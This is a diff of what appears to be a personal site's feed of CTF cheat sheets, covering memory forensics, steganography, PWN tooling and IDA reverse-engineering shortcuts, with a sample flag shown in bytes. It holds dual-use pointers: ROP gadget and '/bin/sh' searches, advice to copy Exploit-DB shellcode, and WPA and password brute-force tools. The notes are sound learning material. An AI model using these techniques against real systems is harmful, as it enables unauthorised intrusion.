+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} timeliner &lt;/code>&lt;/li>
+&lt;li>查看網路連線紀錄
+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} netscan&lt;/code>&lt;/li>
+&lt;li>在memory中用yarascan去search不同的pattern
+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} yarascan -Y &amp;quot;example strings&amp;quot;&lt;/code>&lt;/li>
+&lt;li>console中的command紀錄
+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} consoles&lt;/code>&lt;/li>
+&lt;li>查看iexplorer的紀錄
+&lt;code>$ ./volatility_2.6_win64_standalone.exe -f {image name} --profile {profile name} iehistory&lt;/code>&lt;/li>
+&lt;/ul></description></item><item><title>Misc Cheat Sheet</title><link>https://bernie6401.github.io/docs/tools/ctf/misc-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/misc-cheat-sheet/</guid><description>&lt;h1 id="misc-cheat-sheet">
+ Misc Cheat Sheet
+ &lt;a class="anchor" href="#misc-cheat-sheet">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="online-tools">
+ Online Tools
+ &lt;a class="anchor" href="#online-tools">#&lt;/a>
+&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Encode &amp;amp; Decode&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;a href="https://online-barcode-reader.inliteresearch.com/">Free Online Barcode Reader&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;a href="https://products.aspose.app/barcode/recognize/qr#/recognized">QR Code Barcode Reader Online&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;a href="https://emn178.github.io/online-tools/index.html">Encoding&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;a href="https://roar.iiilab.com/">獸語&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="check-file-info">
+ Check file info
+ &lt;a class="anchor" href="#check-file-info">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ binwalk [-e] [filename] # or binwalk --dd=&amp;#34;.*&amp;#34; [filename]
+$ exiftool [filename]
+$ pngcheck [filename]
+$ stat [filename]
+$ file [filename]
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>&lt;code>$ binwalk -e&lt;/code> 的範例可以參考&lt;a href="https://hackmd.io/@SBK6401/BJgwrxWM6#Electric-Steel">Deadface - Electric Steel &lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="steganography">
+ Steganography
+ &lt;a class="anchor" href="#steganography">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>text: &lt;a href="https://github.com/zed-0xff/zsteg">zsteg&lt;/a>(just for &lt;code>bmp&lt;/code> and &lt;code>png&lt;/code> files), &lt;a href="http://quickcrypto.com/download.html">Quick Crypto&lt;/a>&lt;/li>
+&lt;li>file: steghide(&lt;code>sudo apt-get install steghide&lt;/code>)(&lt;code>$ steghide extract -sf atbash.jpg&lt;/code>)&lt;/li>
+&lt;li>進階的steghide$\to$&lt;a href="https://github.com/RickdeJager/stegseek">stegseek&lt;/a>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ wget https://github.com/RickdeJager/stegseek/releases/download/v0.6/stegseek_0.6-1.deb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo apt install ./stegseek_0.6-1.deb -y
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ stegseek &lt;span style="color:#f92672">[&lt;/span>stegofile.jpg&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>wordlist.txt&lt;span style="color:#f92672">]&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ul>
+&lt;h2 id="disk-analysis">
+ Disk Analysis
+ &lt;a class="anchor" href="#disk-analysis">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://darkranger.no-ip.org/archives/v5/document/linux/foremost_recovery.htm">Foremost&lt;/a>: 針對所支援的檔案結構去進行資料搜尋與救援
+&lt;code>$ foremost -v {filename}&lt;/code>&lt;/li>
+&lt;li>&lt;a href="https://blog.csdn.net/wxh0000mm/article/details/99447206">Sleuth kit/Autopsy&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.exterro.com/ftk-imager">FTK Imager&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://hackmd.io/@SBK6401/SJOwGrUfa">Logontracer&lt;/a>: Just use GUI to present event log traced on windows
+&lt;code>$ python logontracer.py -r -o 8000 -u neo4j -p neo4j -s localhost&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="memory-forensics">
+ Memory Forensics
+ &lt;a class="anchor" href="#memory-forensics">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>建議直接使用&lt;a href="https://www.volatilityfoundation.org/releases">windown protable version&lt;/a>會比較穩定而且不需要處理環境的問題&lt;/li>
+&lt;li>&lt;a href="https://hackmd.io/@TuX-/BymMpKd0s">Volatility - Cheat Sheet&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility3">Volatility 3&lt;/a>
+:::spoiler Set up &amp;amp; How2Use
+&lt;a href="https://blog.csdn.net/u011250160/article/details/120461405">Windows Volatility 3 Problems &amp;amp; Solutions&lt;/a>
+&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/volatilityfoundation/volatility3
+$ cd volatility3
+$ pip install -r requirement.txt
+$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
+$ python vol.py -h # For help
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;li>&lt;a href="https://github.com/volatilityfoundation/volatility">Volatility 2&lt;/a>
+:::spoiler Set up &amp;amp; How2Use
+&lt;a href="https://volatility3.readthedocs.io/en/latest/getting-started-windows-tutorial.html">Windows Set up Tutorials&lt;/a>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ conda create --name py27 python=2.7
+$ conda activate py27
+$ git clone https://github.com/volatilityfoundation/volatility
+$ cd volatility
+$ pip install pycrypto
+$ pip install distorm3
+$ python vol.py -f &amp;lt;path to memory image&amp;gt; plugin_name plugin_option
+$ python vol.py -h # For help
+&lt;/code>&lt;/pre>:::&lt;/li>
+&lt;/ul>
+&lt;h2 id="package">
+ Package
+ &lt;a class="anchor" href="#package">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://packetlife.net/blog/2008/oct/18/cheat-sheets-tcpdump-and-wireshark/">Wireshark cheat sheet&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.osslab.tw/books/linux-administration/page/nmap-%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4%E9%9B%86">&lt;code>nmap&lt;/code>&lt;/a>:
+&lt;code>$ sudo apt-get install nmap&lt;/code>&lt;/li>
+&lt;li>&lt;a href="https://www.ibm.com/docs/zh-tw/aix/7.3?topic=n-ntpdc4-command">&lt;code>ntpdc&lt;/code>&lt;/a>
+&lt;code>$ sudo apt-get install ntpdc&lt;/code>&lt;/li>
+&lt;li>tcpflow
+&lt;code>$ sudo tcpflow -r {pcap file}&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;h2 id="brute-force-password">
+ Brute Force Password
+ &lt;a class="anchor" href="#brute-force-password">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>for WPA/Wifi based: &lt;a href="https://linuxhint.com/install_aircrack-ng_ubuntu/">&lt;code>aircrack-ng&lt;/code>&lt;/a>, &lt;a href="https://ithelp.ithome.com.tw/articles/10280928">Wifite&lt;/a>&lt;/li>
+&lt;li>for system user: &lt;a href="https://ithelp.ithome.com.tw/articles/10300529">John the Ripper&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="sound">
+ Sound
+ &lt;a class="anchor" href="#sound">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>hide files: &lt;a href="https://www.petitcolas.net/steganography/mp3stego/">MP3stego&lt;/a>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ ./encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ./decode -X -P pass svega_stego.mp3
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>sound to image:
+&lt;ul>
+&lt;li>&lt;a href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">How to convert a SSTV audio file to images using QSSTV - en&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.srcmini.com/62326.html">How to convert a SSTV audio file to images using QSSTV - zh-cn&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>hide message: &lt;a href="https://sourceforge.net/projects/silenteye/">silenteye&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="mail">
+ Mail
+ &lt;a class="anchor" href="#mail">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://goldfynch.com/goldfynch-pst-viewer">PST Viewer&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://products.groupdocs.app/zh-hant/viewer/eml">eml Viewer&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.thunderbird.net/zh-TW/">ThunderBird Client&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h2 id="overall">
+ Overall
+ &lt;a class="anchor" href="#overall">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://aperisolve.fr/">All stego decrypt tools&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://tools.miku.ac/">All stego encrypt tools&lt;/a>&lt;/li>
+&lt;li>&lt;a href="http://www.ctftools.com/">ctf tool&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://w1a2d3s4q5e6.blogspot.com/2016/06/blog-post.html">Other people&amp;rsquo;s note&lt;/a>&lt;/li>
+&lt;/ul></description></item><item><title>PWN Overview</title><link>https://bernie6401.github.io/docs/tools/ctf/pwn-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/pwn-overview/</guid><description>&lt;h1 id="pwn-overview">
+ PWN Overview
+ &lt;a class="anchor" href="#pwn-overview">#&lt;/a>
+&lt;/h1>
+&lt;p>:::spoiler TOC
+[TOC]
+:::&lt;/p>
+&lt;h2 id="tools-cheat">
+ Tools Cheat
+ &lt;a class="anchor" href="#tools-cheat">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>Commonly Used Commands
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file {file path}
+$ checksec {file path} # sudo apt-get install checksec
+$ objdump -M intel -d {file path} | less
+$ gdb {file path} # sudo apt-get install gdb
+$ readelf -a {file path} | less # 查看所有資訊，包含section/file-header/program headers/symbol tables/等等
+$ readelf -S {file path} # 只查看sections&amp;#39; header
+$ ldd {file path} # to check what libraries the file used
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>Command Used Tools / Plugin
+&lt;ul>
+&lt;li>&lt;a href="https://github.com/longld/peda">gdb-peda&lt;/a>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/longld/peda.git ~/peda
+$ echo &amp;#34;source ~/peda/peda.py&amp;#34; &amp;gt;&amp;gt; ~/.gdbinit
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>&lt;a href="https://github.com/radareorg/radare2">radare2&lt;/a>
+&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ git clone https://github.com/radare/radare2.git
+$ sudo apt install build-essential # just for wsl
+$ sudo ./radare2/sys/install.sh
+&lt;/code>&lt;/pre>&lt;/li>
+&lt;li>&lt;a href="https://www.exploit-db.com/shellcodes">Exploit DB - Shell Code&lt;/a>：如果要寫shell code的話可以直接看exploit db上別人寫好的gadget，複製起來就可以用了，不過有時候也有可能會失敗，在確認其他東西都是正確的情況下，可以試看看別的，記得平台要選對&lt;/li>
+&lt;li>&lt;a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget&lt;/a>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install python3-pip
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo -H python3 -m pip install ROPgadget
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --help
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># For using&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> | grep &lt;span style="color:#e6db74">&amp;#39;pop rax.*ret&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># Or&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> &amp;gt; rop_gadget.txt
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --only &lt;span style="color:#e6db74">&amp;#34;pop|ret|syscall&amp;#34;&lt;/span> --multibr &amp;gt; rop_gadget.txt &lt;span style="color:#75715e"># multibr是multi bransh允許多分支的gadget&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 取得特定string的gadget&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ ROPgadget --binary &lt;span style="color:#f92672">{&lt;/span>executed file&lt;span style="color:#f92672">}&lt;/span> --string &lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>&lt;a href="https://github.com/david942j/one_gadget">one_gadget&lt;/a>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install rubygems
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sudo gem install one_gadget
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ one_gadget &lt;span style="color:#f92672">{&lt;/span>libc file&lt;span style="color:#f92672">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>seccomp-tools
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install gcc ruby-dev
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ gem install seccomp-tools
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ seccomp-tools dump ./test
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>找glibc版本的online tool
+&lt;a href="https://libc.rip/">libc-database search API Search&lt;/a>
+&lt;a href="https://libc.blukat.me/?q=__libc_start_main_ret">libc database search&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="gdb">
+ gdb
+ &lt;a class="anchor" href="#gdb">#&lt;/a>
+&lt;/h3>
+&lt;p>:::spoiler 常用語法(&lt;a href="https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf">cheat&lt;/a>)&lt;/p></description></item><item><title>Reverse Overview</title><link>https://bernie6401.github.io/docs/tools/ctf/reverse-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/tools/ctf/reverse-overview/</guid><description>&lt;h1 id="reverse-overview">
+ Reverse Overview
+ &lt;a class="anchor" href="#reverse-overview">#&lt;/a>
+&lt;/h1>
+&lt;h2 id="tools">
+ Tools
+ &lt;a class="anchor" href="#tools">#&lt;/a>
+&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Type&lt;/th>
+ &lt;th>App&lt;/th>
+ &lt;th>.NET&lt;/th>
+ &lt;th>x86/x64&lt;/th>
+ &lt;th>Packer&lt;/th>
+ &lt;th>Python&lt;/th>
+ &lt;th>C&lt;/th>
+ &lt;th>General&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>Description&lt;/td>
+ &lt;td>&lt;li> MobSF: Must run in python &lt;code>3.8&lt;/code>&lt;/li>&lt;li>ApkTool: Just follow the step in &lt;a href="https://apktool.org/docs/install/">install guide&lt;/a>&lt;/li>&lt;/td>
+ &lt;td>To decompile C#(.NET)&lt;/td>
+ &lt;td>&lt;/td>
+ &lt;td>指令：&lt;code>$ upx -d {filename}&lt;/code>&lt;/td>
+ &lt;td>&lt;/td>
+ &lt;td>一個可以把組語轉換成c pseudo code的線上工具&lt;/td>
+ &lt;td>一個線上的decompiler，結合多種工具，只要上傳檔案(小於2MB)就可以呈現多種decompiler tools的結果&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>Link&lt;/td>
+ &lt;td>&lt;a href="https://ithelp.ithome.com.tw/articles/10215522">MobSF&lt;/a>&lt;/br>&lt;a href="https://apktool.org/">ApkTools&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://github.com/dnSpy/dnSpy/releases">dnSpy&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://carlosrafaelgn.com.br/Asm86/">x86模擬器&lt;/a>&lt;/br>&lt;a href="https://defuse.ca/online-x86-assembler.htm#disassembly">x86/x64 assembler/disassembler&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://github.com/upx/upx/releases/tag/v4.0.2">UPX Packer&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://tool.lu/pyc/">Pyc disassemble&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://godbolt.org/">Compiler Explorer&lt;/a>&lt;/td>
+ &lt;td>&lt;a href="https://dogbolt.org/">Decompiler Explorer&lt;/a>&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;h2 id="ida-常用快捷鍵">
+ IDA 常用快捷鍵
+ &lt;a class="anchor" href="#ida-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
+&lt;/h2>
+&lt;ul>
+&lt;li>&lt;a href="https://blog.30cm.tw/2018/01/ida.html">IDA Interface&lt;/a>&lt;/li>
+&lt;li>型別
+&lt;ul>
+&lt;li>char(1 byte)&lt;/li>
+&lt;li>WORD(2 bytes)&lt;/li>
+&lt;li>DWORD(4 bytes)&lt;/li>
+&lt;li>PDWORD(pointer of DWORD = DWORD *)&lt;/li>
+&lt;li>若是DWORD *name，代表name這個變數是一個pointer而且指向的地方是一個DWORD&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Space: 在 Text View / Graph View 切換&lt;/li>
+&lt;li>Tab: 在視窗之間切換&lt;/li>
+&lt;li>;/Insert: 註解&lt;/li>
+&lt;li>x: 秀出 Xrefs&lt;/li>
+&lt;li>n: 改名&lt;/li>
+&lt;li>y: 改型別&lt;/li>
+&lt;li>h: 改表示方式 (dec / hex)&lt;/li>
+&lt;li>u: 取消定義&lt;/li>
+&lt;li>a: 當成字串&lt;/li>
+&lt;li>c: 當成code&lt;/li>
+&lt;li>p: 當成function&lt;/li>
+&lt;li>t: set sizeof(XXX)；如果已經確定目前的constant就是某個變數的length，那可以直接按t讓他變成sizeof(那個變數)
+舉例：如果已經確定目前的&lt;code>0x238&lt;/code>就是&lt;code>PROCESSENTRY32W&lt;/code>的size，就可以直接這樣用，會變得比較清楚
+:::spoiler 結果
+&lt;img src="https://hackmd.io/_uploads/S1nruHTza.png" alt="" />
+&lt;img src="https://hackmd.io/_uploads/rkjwuBTza.png" alt="" />
+:::&lt;/li>
+&lt;li>Shift+F1: show出Local Type視窗
+:::spoiler Local Types Screenshot
+&lt;img src="https://hackmd.io/_uploads/S1ikDa5_n.png" alt="" />
+:::&lt;/li>
+&lt;li>Shift+F12: 開啟Strings視窗
+:::spoiler Strings Screenshot
+&lt;img src="https://hackmd.io/_uploads/HybvLzo_2.png" alt="" />
+:::&lt;/li>
+&lt;li>對某一個數值按m: ENUM這個功能就是在替換一些常見的windows API參數，讓原本的純數字可以用文字表示，這樣比較好懂API的操作，逆向會更順暢(補充說明：IDA有收錄很多MSDN上的一些API，他每一個參數表示的文字，例如&lt;a href="https://learn.microsoft.com/en-us/windows/win32/Memory/memory-protection-constants">這一篇&lt;/a>底下有顯示很多Constant/value的對應，而正常情況下IDA會顯示的是value，如果要把它換成Constant文字的表達式就可以用到ENUM這個功能)，又例如:
+目前已經知道&lt;code>CreateToolhelp32Snapshot(2, 0);&lt;/code>中的2的意義是&lt;code>TH32CS_SNAPPROCESS&lt;/code>(可以參考&lt;a href="https://learn.microsoft.com/zh-tw/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot#parameters">MSDN&lt;/a>)，此時就可以直接按m之後再選擇&lt;code>TH32CS_SNAPPROCESS&lt;/code>
+:::spoiler
+&lt;img src="https://hackmd.io/_uploads/B1Rn5Q6G6.png" alt="" />
+:::&lt;/li>
+&lt;li>\: 不顯示/顯示資料型別&lt;/li>
+&lt;li>Alt+M/Ctrl+M: 前者是註冊書籤，後者是察看並選擇標籤，可以快速跑到標示的地址&lt;/li>
+&lt;li>Ctrl+E: 如果是分析DLL file，可能會有很多不同的entry point，利用這個shortcut可以顯示目前有幾個entry point，很方便
+:::spoiler
+&lt;img src="https://hackmd.io/_uploads/ryJw-C6Ga.png" alt="" />
+:::&lt;/li>
+&lt;li>如何把bytes變成字串:
+&lt;ul>
+&lt;li>可以直接Alt+A
+:::spoiler&lt;/li>
+&lt;/ul>
+&lt;ol>
+&lt;li>可以先把bytes的型別定義好(單獨的bytes變成array)，變成array有兩種方法，第一種是直接用&lt;code>Y&lt;/code>定義他的型別成&lt;code>int dword_2008[32]&lt;/code>，前面的int就看每一個字元是來決定，後面&lt;code>[32]&lt;/code>就代表有多少字元變成array；第二種方法就是直接按&lt;code>d&lt;/code>改變一個字元的型態變成int，然後在&lt;code>edit/Array&lt;/code>的地方可以叫出&lt;code>Convert to array&lt;/code>的視窗(如果前面沒有先用&lt;code>d&lt;/code>改變型態的話，他會以為所有字元都是一個byte，然後總共有128個字元這樣換算，但其實我們是總共32個字元，每一個字元是4個bytes，也就是int，這一點要特別注意)
+&lt;img src="https://hackmd.io/_uploads/HJ3yvI-Ga.png" alt="" />
+&lt;img src="https://hackmd.io/_uploads/r1A_8LWMa.png" alt="" />&lt;/li>
+&lt;li>接著就是在&lt;code>Option/String literals&lt;/code>視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style
+&lt;img src="https://hackmd.io/_uploads/SyQBP8Zfp.png" alt="" />
+:::
+:::spoiler 完整流程&lt;/li>
+&lt;/ol>
+&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o
+.rodata:0000000000002009 db 0
+.rodata:000000000000200A db 0
+.rodata:000000000000200B db 0
+.rodata:000000000000200C db 4Ch ; L
+.rodata:000000000000200D db 0
+.rodata:000000000000200E db 0
+.rodata:000000000000200F db 0
+.rodata:0000000000002010 db 41h ; A
+.rodata:0000000000002011 db 0
+.rodata:0000000000002012 db 0
+.rodata:0000000000002013 db 0
+.rodata:0000000000002014 db 47h ; G
+.rodata:0000000000002015 db 0
+.rodata:0000000000002016 db 0
+.rodata:0000000000002017 db 0
+.rodata:0000000000002018 db 7Bh ; {
+.rodata:0000000000002019 db 0
+.rodata:000000000000201A db 0
+.rodata:000000000000201B db 0
+.rodata:000000000000201C db 68h ; h
+.rodata:000000000000201D db 0
+.rodata:000000000000201E db 0
+.rodata:000000000000201F db 0
+.rodata:0000000000002020 db 33h ; 3
+.rodata:0000000000002021 db 0
+.rodata:0000000000002022 db 0
+.rodata:0000000000002023 db 0
+.rodata:0000000000002024 db 31h ; 1
+.rodata:0000000000002025 db 0
+.rodata:0000000000002026 db 0
+.rodata:0000000000002027 db 0
+.rodata:0000000000002028 db 31h ; 1
+.rodata:0000000000002029 db 0
+.rodata:000000000000202A db 0
+.rodata:000000000000202B db 0
+.rodata:000000000000202C db 4Fh ; O
+.rodata:000000000000202D db 0
+.rodata:000000000000202E db 0
+.rodata:000000000000202F db 0
+.rodata:0000000000002030 db 5Fh ; _
+.rodata:0000000000002031 db 0
+.rodata:0000000000002032 db 0
+.rodata:0000000000002033 db 0
+.rodata:0000000000002034 db 72h ; r
+.rodata:0000000000002035 db 0
+.rodata:0000000000002036 db 0
+.rodata:0000000000002037 db 0
+.rodata:0000000000002038 db 65h ; e
+.rodata:0000000000002039 db 0
+.rodata:000000000000203A db 0
+.rodata:000000000000203B db 0
+.rodata:000000000000203C db 76h ; v
+.rodata:000000000000203D db 0
+.rodata:000000000000203E db 0
+.rodata:000000000000203F db 0
+.rodata:0000000000002040 db 65h ; e
+.rodata:0000000000002041 db 0
+.rodata:0000000000002042 db 0
+.rodata:0000000000002043 db 0
+.rodata:0000000000002044 db 72h ; r
+.rodata:0000000000002045 db 0
+.rodata:0000000000002046 db 0
+.rodata:0000000000002047 db 0
+.rodata:0000000000002048 db 73h ; s
+.rodata:0000000000002049 db 0
+.rodata:000000000000204A db 0
+.rodata:000000000000204B db 0
+.rodata:000000000000204C db 31h ; 1
+.rodata:000000000000204D db 0
+.rodata:000000000000204E db 0
+.rodata:000000000000204F db 0
+.rodata:0000000000002050 db 6Eh ; n
+.rodata:0000000000002051 db 0
+.rodata:0000000000002052 db 0
+.rodata:0000000000002053 db 0
+.rodata:0000000000002054 db 67h ; g
+.rodata:0000000000002055 db 0
+.rodata:0000000000002056 db 0
+.rodata:0000000000002057 db 0
+.rodata:0000000000002058 db 5Fh ; _
+.rodata:0000000000002059 db 0
+.rodata:000000000000205A db 0
+.rodata:000000000000205B db 0
+.rodata:000000000000205C db 33h ; 3
+.rodata:000000000000205D db 0
+.rodata:000000000000205E db 0
+.rodata:000000000000205F db 0
+.rodata:0000000000002060 db 6Eh ; n
+.rodata:0000000000002061 db 0
+.rodata:0000000000002062 db 0
+.rodata:0000000000002063 db 0
+.rodata:0000000000002064 db 67h ; g
+.rodata:0000000000002065 db 0
+.rodata:0000000000002066 db 0
+.rodata:0000000000002067 db 0
+.rodata:0000000000002068 db 69h ; i
+.rodata:0000000000002069 db 0
+.rodata:000000000000206A db 0
+.rodata:000000000000206B db 0
+.rodata:000000000000206C db 6Eh ; n
+.rodata:000000000000206D db 0
+.rodata:000000000000206E db 0
+.rodata:000000000000206F db 0
+.rodata:0000000000002070 db 65h ; e
+.rodata:0000000000002071 db 0
+.rodata:0000000000002072 db 0
+.rodata:0000000000002073 db 0
+.rodata:0000000000002074 db 65h ; e
+.rodata:0000000000002075 db 0
+.rodata:0000000000002076 db 0
+.rodata:0000000000002077 db 0
+.rodata:0000000000002078 db 72h ; r
+.rodata:0000000000002079 db 0
+.rodata:000000000000207A db 0
+.rodata:000000000000207B db 0
+.rodata:000000000000207C db 35h ; 5
+.rodata:000000000000207D db 0
+.rodata:000000000000207E db 0
+.rodata:000000000000207F db 0
+.rodata:0000000000002080 db 7Dh ; }
+.rodata:0000000000002081 db 0
+.rodata:0000000000002082 db 0
+.rodata:0000000000002083 db 0
+.rodata:0000000000002084 db 0
+.rodata:0000000000002085 db 0
+.rodata:0000000000002086 db 0
+.rodata:0000000000002087 db 0
+&lt;/code>&lt;/pre>$\downarrow$
+&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h
